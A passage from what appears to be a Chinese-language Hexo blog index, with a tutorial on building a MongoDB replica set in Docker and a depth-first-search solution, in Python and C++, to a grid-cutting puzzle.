日志的启用时间段</span></span><br><span class="line"><span class="string">   oplog first event time:      第一个事务日志的产生时间</span></span><br><span class="line"><span class="string">   oplog last event time:       最后一个事务日志的产生时间</span></span><br><span class="line"><span class="string">   now:                         现在的时间</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">2）查看 slave 状态 通过"db.printSlaveReplicationInfo()"可以查看 slave 的同步状态</span></span><br><span class="line"><span class="string">  当插入一条新的数据,然后重新检查 slave 状态时,就会发现 sync 时间更新了'</span></span><br></pre></td></tr></table></figure><h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull mongo:latest(可以选择需要的版本)</span><br></pre></td></tr></table></figure><p>这里直接拉取的官方的镜像，你也可以使用其他镜像</p><h3 id="设置network"><a href="#设置network" class="headerlink" title="设置network"></a>设置network</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker network create my-mongo-cluster</span><br><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p> 这是一个自建的网络，docker1.9之后的版本可以手动创建网络，详情参考命令<code>docker network create</code>，我这里使用自定义的网络，主要的目的是让容器可以通过container_name互联，也就是在这种网络模式下，hosts是docker帮忙配置解析的，为什么要这么做呢？因为docker container的ip不是固定的，一旦down掉然后重启，ip有可能会发生变化，但是hostname是不会变的。</p><h3 id="编写docker-compose-yml"><a href="#编写docker-compose-yml" class="headerlink" title="编写docker-compose.yml"></a>编写<code>docker-compose.yml</code></h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mongo1:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="attr">mongo:latest</span></span><br><span class="line"><span class="attr">  container_name:</span> <span class="string">"mongo1"</span> </span><br><span class="line"><span class="attr">  net:</span> <span class="string">"my-mongo-cluster"</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"27017:27017"</span></span><br><span class="line"><span class="attr">  command:</span> <span class="string">mongod</span> <span class="bullet">--replSet</span> <span class="string">mongoreplset</span></span><br><span class="line"><span class="attr">mongo2:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="attr">mongo:latest</span></span><br><span class="line"><span class="attr">  container_name:</span> <span class="string">"mongo2"</span></span><br><span class="line"><span class="attr">  net:</span> <span class="string">"my-mongo-cluster"</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"27016:27017"</span></span><br><span class="line"><span class="attr">  command:</span> <span class="string">mongod</span> <span class="bullet">--replSet</span> <span class="string">mongoreplset</span></span><br><span class="line"><span class="attr">mongo3:</span></span><br><span class="line"><span class="attr">  image:</span> <span class="attr">mongo:latest</span></span><br><span class="line"><span class="attr">  container_name:</span> <span class="string">"mongo3"</span></span><br><span class="line"><span class="attr">  net:</span> <span class="string">"my-mongo-cluster"</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"27015:27017"</span></span><br><span class="line"><span class="attr">  command:</span> <span class="string">mongod</span> <span class="bullet">--replSet</span> <span class="string">mongoreplset</span></span><br></pre></td></tr></table></figure><p>使用<code>docker-compose -f docker-compose.yml up -d</code>搭建副本集，用<code>docker container ls</code>查看启动的容器</p><h3 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h3><p>使用<code>docker exec -it mongo1 mongo</code>进入mongo1容器的mongo命令模式，执行以下命令:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config = &#123;<span class="string">"_id"</span> : <span class="string">"mongoreplset"</span>,<span class="string">"members"</span> : [&#123;<span class="string">"_id"</span> : 0,<span class="string">"host"</span> : <span class="string">"mongo1:27017"</span>&#125;,&#123;<span class="string">"_id"</span> : 1,<span class="string">"host"</span> : <span class="string">"mongo2:27017"</span>&#125;,&#123;<span class="string">"_id"</span> : 2,<span class="string">"host"</span> : <span class="string">"mongo3:27017"</span>&#125;]&#125;</span><br><span class="line">rs.initiate(config)</span><br></pre></td></tr></table></figure></p><p>然后可以使用<code>rs.status</code>查看副本集状态</p><h3 id="验证同步"><a href="#验证同步" class="headerlink" title="验证同步"></a>验证同步</h3><ol><li><p>使用<code>docker  exec -it mongo1 mongo</code>进入mongo1的mongo命令行，新建数据库test，并向集合people插入几条记录：<br><img src="http://p5m1dtoh7.bkt.clouddn.com/docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86_1.png" alt=""></p></li><li><p>进入m2容器，执行mongo进入mongodb的控制台，查看test数据库的记录，返回错误。mongodb默认读写都是在Primary上进行的，副本节点不允许读写，可以使用如下命令来允许副本读：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.getMongo().setSlaveOk()</span><br></pre></td></tr></table></figure><p> <img src="http://p5m1dtoh7.bkt.clouddn.com/docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86_2.png" alt=""></p></li><li><p>在m2上也执行命令db.getMongo().setSlaveOk()，使得m2也能读数据；</p></li></ol><h3 id="验证故障转移"><a href="#验证故障转移" class="headerlink" title="验证故障转移"></a>验证故障转移</h3><p>副本集模式下，如果Primary不可用，整个集群将会选举出新的Primary来继续对外提供读写服务，一起来验证一下m0不可用的时候的状况：  </p><ol><li>打开一个终端执行<code>docker stop m1</code>停掉m1容器；</li><li>执行 <code>docker exec -it mongo2 mongo</code>，再执行<code>rs.status</code>:<br> <img src="http://p5m1dtoh7.bkt.clouddn.com/docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86_3.png" alt=""><br> <img src="http://p5m1dtoh7.bkt.clouddn.com/docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86_4.png" alt=""><br> 可以看到mongo1已经不可达了，mongo3被选为primary</li><li>重新启动mongo1，<code>docker start mongo1</code>，进入mongo1的mongo,执行<code>rs.status()</code><br> <img src="http://p5m1dtoh7.bkt.clouddn.com/docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86_5.png" alt=""><br> 可以看到monogo1重新连入了副本集，但是是作为secondry，primary任然是mongo3</li></ol><h3 id="验证登录配置-后序再补充"><a href="#验证登录配置-后序再补充" class="headerlink" title="验证登录配置(后序再补充)"></a>验证登录配置(后序再补充)</h3><h3 id="在python中的使用"><a href="#在python中的使用" class="headerlink" title="在python中的使用"></a>在<code>python</code>中的使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-03-31 16:26:23</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : |</span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient, ReadPreference</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">'mongodb://host1:port1,host2:port2,host3:port3'</span>,</span><br><span class="line">                     replicaSet=<span class="string">'mongoreplset'</span>, readPreference=<span class="string">'secondary'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用3个ip是为了避免primary挂掉时程序无法连接到数据库。也利用到了mongodb副本集的故障转移功能</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">replicaSet指定副本集名称</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">readPreference有以下几种选项:</span></span><br><span class="line"><span class="string">- primary</span></span><br><span class="line"><span class="string">- primaryPreferred</span></span><br><span class="line"><span class="string">- secondary</span></span><br><span class="line"><span class="string">- secondaryPreferred</span></span><br><span class="line"><span class="string">- nearest</span></span><br><span class="line"><span class="string">默认primary</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">db = client[<span class="string">'test'</span>]</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> db[<span class="string">'people'</span>].find():</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure><p><strong><em>注:代码中的ip:port填自己的</em></strong></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.cnblogs.com/zhoujinyi/p/4635444.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhoujinyi/p/4635444.html</a></li><li><a href="http://www.cnblogs.com/kevingrace/p/5685486.html" target="_blank" rel="noopener">http://www.cnblogs.com/kevingrace/p/5685486.html</a></li><li><a href="http://www.kivixv.com/2016/08/15/docker/%E5%9F%BA%E4%BA%8Edocker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86/" target="_blank" rel="noopener">http://www.kivixv.com/2016/08/15/docker/%E5%9F%BA%E4%BA%8Edocker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86/</a></li><li><a href="https://blog.csdn.net/boling_cavalry/article/details/78173636" target="_blank" rel="noopener">https://blog.csdn.net/boling_cavalry/article/details/78173636</a></li><li><a href="http://api.mongodb.com/python/current/examples/high_availability.html" target="_blank" rel="noopener">pymongo操作副本集</a></li></ul>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mongodb </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>剪格子 简单的DFS</title>
      <link href="/%E5%89%AA%E6%A0%BC%E5%AD%90%20%E7%AE%80%E5%8D%95%E7%9A%84DFS.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">读万卷书，行万里路</blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如下图所示，3 x 3 的格子中填写了一些整数。</span><br><span class="line">+--*--+--+  </span><br><span class="line">|10* 1|52|  </span><br><span class="line">+--****--+  </span><br><span class="line">|20|30* 1|  </span><br><span class="line">*******--+  </span><br><span class="line">| 1| 2| 3|  </span><br><span class="line">+--+--+--+</span><br><span class="line">我们沿着图中的星号线剪开，得到两个部分，每个部分的数字和都是60......</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">如下图所示，3 x 3 的格子中填写了一些整数。</span><br><span class="line">+--*--+--+  </span><br><span class="line">|10* 1|52|  </span><br><span class="line">+--****--+  </span><br><span class="line">|20|30* 1|  </span><br><span class="line">*******--+  </span><br><span class="line">| 1| 2| 3|  </span><br><span class="line">+--+--+--+</span><br><span class="line"></span><br><span class="line">我们沿着图中的星号线剪开，得到两个部分，每个部分的数字和都是60。</span><br><span class="line">本题的要求就是请你编程判定：对给定的m x n 的格子中的整数，是否可以分割为两个部分，使得这两个区域的数字和相等。</span><br><span class="line">如果存在多种解答，请输出包含左上角格子的那个区域包含的格子的最小数目。</span><br><span class="line">如果无法分割，则输出 0。</span><br><span class="line"></span><br><span class="line">输入格式</span><br><span class="line">程序先读入两个整数 m n 用空格分割 (m,n&lt;10)。</span><br><span class="line">表示表格的宽度和高度。</span><br><span class="line">接下来是n行，每行m个正整数，用空格分开。每个整数不大于10000。</span><br><span class="line"></span><br><span class="line">输出格式</span><br><span class="line">输出一个整数，表示在所有解中，包含左上角的分割区可能包含的最小的格子数目。</span><br><span class="line"></span><br><span class="line">样例输入1</span><br><span class="line">3 3  </span><br><span class="line">10 1 52  </span><br><span class="line">20 30 1  </span><br><span class="line">1 2 3</span><br><span class="line">样例输出1</span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">样例输入2</span><br><span class="line">4 3  </span><br><span class="line">1 1 1 1  </span><br><span class="line">1 30 80 2  </span><br><span class="line">1 1 1 100</span><br><span class="line">样例输出2</span><br><span class="line">10</span><br><span class="line"></span><br><span class="line">注意这个题先输入的是列，然后是行</span><br></pre></td></tr></table></figure><h2 id="python版代码"><a href="#python版代码" class="headerlink" title="python版代码"></a>python版代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-03-31 10:20:40</span></span><br><span class="line"><span class="comment"># @Author  : longofo</span></span><br><span class="line"><span class="comment"># @Email   : </span></span><br><span class="line"><span class="comment"># @Link    : http://longofo.cc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CutLatticeProblem</span>:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">格子剪切问题</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, row, col, map_lst)</span>:</span></span><br><span class="line">        self.row = row  <span class="comment"># 行</span></span><br><span class="line">        self.col = col  <span class="comment"># 列</span></span><br><span class="line">        self.map_lst = map_lst  <span class="comment"># 格子列表</span></span><br><span class="line">        self.dirc = [(<span class="number">1</span>, <span class="number">0</span>), (<span class="number">-1</span>, <span class="number">0</span>), (<span class="number">0</span>, <span class="number">-1</span>), (<span class="number">0</span>, <span class="number">1</span>)]  <span class="comment"># 方向:上下左右</span></span><br><span class="line">        self.visited = [[<span class="keyword">False</span>] * col <span class="keyword">for</span> _ <span class="keyword">in</span> range(row)]  <span class="comment"># 初始化标志列表</span></span><br><span class="line">        self.sum = sum([sum(item) <span class="keyword">for</span> item <span class="keyword">in</span> map_lst])  <span class="comment"># 计算矩阵总和</span></span><br><span class="line">        self.min_count = float(<span class="string">'inf'</span>)  <span class="comment"># 定义一个无穷大的数</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(self, x, y)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    判断坐标是否超出格子列表</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">        <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">or</span> x &gt;= self.row <span class="keyword">or</span> y &lt; <span class="number">0</span> <span class="keyword">or</span> y &gt;= self.col:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dfs</span><span class="params">(self, posx, posy, add, count)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    采用深度优先遍历</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">        <span class="keyword">if</span> add == self.sum / <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># 这里min_count的值就是左上角围成的数字的数目，因为一开始就是从左上角开始的</span></span><br><span class="line">            <span class="keyword">if</span> count &lt; self.min_count:</span><br><span class="line">                self.min_count = count</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> dic <span class="keyword">in</span> self.dirc:</span><br><span class="line">            next_x, next_y = posx + dic[<span class="number">0</span>], posy + dic[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.judge(next_x, next_y):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 如果没有访问并且当前经过路径的总和小于等于总和的一半，继续遍历下去</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.visited[next_x][next_y] <span class="keyword">and</span> (add + self.map_lst[next_x][next_y]) &lt;= self.sum / <span class="number">2</span>:</span><br><span class="line">                self.visited[next_x][next_y] = <span class="keyword">True</span> <span class="comment">#标记访问</span></span><br><span class="line">                self.dfs(next_x, next_y, add +</span><br><span class="line">                         self.map_lst[next_x][next_y], count + <span class="number">1</span>)</span><br><span class="line">                self.visited[next_x][next_y] = <span class="keyword">False</span> <span class="comment">#回溯</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">    <span class="comment"># 如果总和为奇数，那么一定找不到合理的方案</span></span><br><span class="line">        <span class="keyword">if</span> self.sum % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            print(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        self.dfs(<span class="number">0</span>, <span class="number">0</span>, self.map_lst[<span class="number">0</span>][<span class="number">0</span>], <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.min_count == float(<span class="string">'inf'</span>):</span><br><span class="line">            print(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(self.min_count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    col = int(input(<span class="string">'input col:'</span>))</span><br><span class="line">    row = int(input(<span class="string">'input row:'</span>))</span><br><span class="line">    map_lst = [[<span class="number">0</span>] * col <span class="keyword">for</span> _ <span class="keyword">in</span> range(row)]</span><br><span class="line">    print(<span class="string">'input a &#123;0&#125; row &#123;1&#125; col 矩阵:'</span>.format(row, col))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(row):</span><br><span class="line">        cols = input().split(<span class="string">' '</span>)</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> range(col):</span><br><span class="line">            map_lst[x][y] = int(cols[y])</span><br><span class="line">    cut_lattice = CutLatticeProblem(row, col, map_lst)</span><br><span class="line">    cut_lattice.main()</span><br></pre></td></tr></table></figure><h2 id="c-版代码"><a href="#c-版代码" class="headerlink" title="c++版代码"></a>c++版代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;  </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span> ;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans = INT_MAX ; <span class="comment">//定义整型最大值</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;&#125;;<span class="comment">//方向</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">15</span>][<span class="number">15</span>] , sum = <span class="number">0</span>;<span class="comment">//保存格子</span></span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">15</span>][<span class="number">15</span>] ;<span class="comment">//标志访问</span></span><br><span class="line"><span class="keyword">int</span> row,col ;<span class="comment">//行列</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//判断是否越界  </span></span><br><span class="line">    <span class="keyword">if</span>(x&lt;<span class="number">0</span>||y&lt;<span class="number">0</span>||x&gt;=row||y&gt;=col)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span> ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span> ;  </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> x , <span class="keyword">int</span> y , <span class="keyword">int</span> add , <span class="keyword">int</span> count)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//深度优先遍历</span></span><br><span class="line">    <span class="keyword">if</span>(add == sum/<span class="number">2</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">if</span>(count&lt;ans)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="comment">//这里count就是左上角区域的数目,因为一开始就是从左上角开始的</span></span><br><span class="line">            ans = count ;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> ;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">4</span> ; ++i)</span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">int</span> nextX = x + dir[i][<span class="number">0</span>] , nextY = y + dir[i][<span class="number">1</span>] ;  </span><br><span class="line">        <span class="keyword">if</span>(!judge(nextX,nextY))  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">continue</span> ;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span>(!visited[nextX][nextY]&amp;&amp;add+<span class="built_in">map</span>[nextX][nextY]&lt;=sum/<span class="number">2</span>)<span class="comment">//没有访问过并且和小于等于总和的一般</span></span><br><span class="line">        &#123;  </span><br><span class="line">            visited[nextX][nextY] = <span class="literal">true</span> ; <span class="comment">//标志访问过 </span></span><br><span class="line">            DFS(nextX,nextY,add+<span class="built_in">map</span>[nextX][nextY],count+<span class="number">1</span>) ;  </span><br><span class="line">            visited[nextX][nextY] = <span class="literal">false</span> ;  <span class="comment">//回溯</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;col,&amp;row) != EOF)  </span><br><span class="line">    &#123;  </span><br><span class="line">        sum = <span class="number">0</span> ;  </span><br><span class="line">        <span class="comment">//注意是先输入的列，在输入的行</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; row ; ++i)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span> ; j &lt; col ; ++j)  </span><br><span class="line">            &#123;  </span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;<span class="built_in">map</span>[i][j]) ;  </span><br><span class="line">                sum += <span class="built_in">map</span>[i][j] ;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sum%<span class="number">2</span> == <span class="number">1</span>)  </span><br><span class="line">        &#123;   <span class="comment">//和为奇数一定没结果的</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"0\n"</span>) ;  </span><br><span 